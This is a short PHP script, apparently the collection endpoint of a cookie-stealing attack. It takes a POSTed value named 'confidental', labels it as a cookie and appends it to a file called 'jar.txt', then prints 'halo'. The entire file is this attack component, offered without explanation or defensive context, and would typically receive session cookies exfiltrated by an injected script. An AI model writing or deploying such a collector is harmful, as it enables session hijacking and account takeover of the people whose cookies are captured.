<?php
if (isset($_POST["confidental"])) {
	$cookie = $_POST["confidental"];
	$myfile = fopen("jar.txt", "a");
	fwrite($myfile, $cookie . "\n\n");
}
echo "halo";
?>
